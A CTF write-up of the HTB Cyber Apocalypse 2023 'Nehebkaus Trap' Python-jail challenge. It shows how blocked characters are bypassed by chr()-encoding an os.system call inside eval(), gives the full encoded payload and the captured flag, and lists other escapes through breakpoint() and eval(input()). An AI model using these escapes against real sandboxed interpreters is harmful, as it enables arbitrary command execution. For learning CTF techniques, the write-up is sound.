---
description: >-
  Write Up For HTB Cyber Apocalypse CTF 2023 Misc challenge Nehebkaus Trap
title: Nehebkaus Trap
date: 2023-03-23 21:00:00 -0400
categories: [CTFs, HTB Cyber Apocalypse CTF 2023, Misc]
tags: [misc, pyjail]
---

In search of the ancient relic, you go looking for the Pharaoh's tomb inside the pyramids. A giant granite block falls and blocks your exit, and the walls start closing in! You are trapped. Can you make it out alive and continue your quest?

-------

As we connect to the target machine, we found ourselves inside a Python shell. However, there was a catch – executing arbitrary code was restricted. The challenge imposed certain limitations by blocking specific characters. Here's a list of the forbidden characters:

```python
('.', '_', '/', '"', ';', ' ', "'", ',')
```

This meant that we couldn't directly run any command or access the coveted `flag.txt` file. But fear not, for we're about to unveil a clever workaround!

After much research and experimentation, we discovered a way to exploit the situation using the `eval()` function. By passing it a string in ASCII numbers format, we could execute the desired commands. To simplify the process, we devised the following Python script:

```python
s = ""
a = '__import__("os").system("cat flag.txt")'
for c in a:
  s += f"chr({str(ord(c))})+"
print(f'eval({s[:-1]})')
```

Let's break down what this script does. It converts each character of the command into its ASCII representation and constructs a new string. Finally, it uses `eval()` to evaluate the generated string as code, enabling the execution of our desired command.

> In Python, the `eval()` function is used to evaluate and execute a string of code as if it were a Python expression. It takes a string as an argument and interprets it as executable code.

Running the script produces both the exploit and its output:

```python
eval(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(34)+chr(111)+chr(115)+chr(34)+chr(41)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(34)+chr(99)+chr(97)+chr(116)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)+chr(34)+chr(41))
```

And the long-awaited result:

```
HTB{y0u_d3f34t3d_th3_sn4k3_g0d!}
```

----

## Further Learning

As the competition drew to a close, my curiosity led me to explore alternative approaches. It turns out, there was a simpler solution that many other teams had employed.

By utilizing the Python debugger shell, we could easily execute any code, including reading the `flag.txt` file. The following commands were particularly ingenious:

```python
breakpoint()
open("flag.txt", "r").read()
```

----

Another exploit that I really liked was:
```python
eval(input())
```

> As mentioned before, the `eval()` function is used to evaluate and execute a string of code as if it were a Python expression. It takes a string as an argument and interprets it as executable code. The `input()` function, on the other hand, prompts the user to enter a value, which is then returned as a string.

Combining these two functions, `eval(input())` allows us to execute any Python code that is entered as input by the user. The user's input is treated as a string, and the eval() function evaluates and executes it as code.

This approach showcased the ingenious thinking of the teams that employed it, demonstrating that sometimes the simplest solutions can be the most effective.


## Conclusion

In conclusion, the Nehebkaus Trap challenge in the HTB Cyber Apocalypse CTF 2023 was an exhilarating experience that tested our problem-solving skills. By leveraging the power of `eval()` and exploring alternative techniques, we managed to overcome the character restrictions and emerge victorious.